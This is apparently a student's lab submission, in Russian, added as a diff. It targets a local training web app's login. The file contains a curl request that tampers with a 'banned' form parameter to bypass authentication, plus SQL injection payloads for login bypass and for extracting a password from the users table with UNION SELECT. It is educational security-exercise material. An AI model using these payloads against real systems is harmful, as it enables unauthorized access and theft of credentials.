@@ -1,0 +1,30 @@
+РИ-581220
+Родионов Леонид
+
+curl-запрос:
+curl 'http://localhost:8080/signin' \
+  -v \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Origin: http://localhost:8080' \
+  -H 'Referer: http://localhost:8080/login.html' \
+  -H 'Sec-Fetch-Dest: document' \
+  -H 'Sec-Fetch-Mode: navigate' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Sec-Fetch-User: ?1' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  --data-raw 'name=Petrov&pass=1234&banned=true' \ <-- Здесь меняем параметр banned на true, тогда при проверке сервер найдет совпадение и выдаст успешный результат
+  --compressed
+
+Подобранный пароль с закодированной кавычкой:
+%27 or 1=1--
+
+Подобранный пароль для получения пароля из БД:
+%27 or 1=1 union select (select min(pass) from users)--
